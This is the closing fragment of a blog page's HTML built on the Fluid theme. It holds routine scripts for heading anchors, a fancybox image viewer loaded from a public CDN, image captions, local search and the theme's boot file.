        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
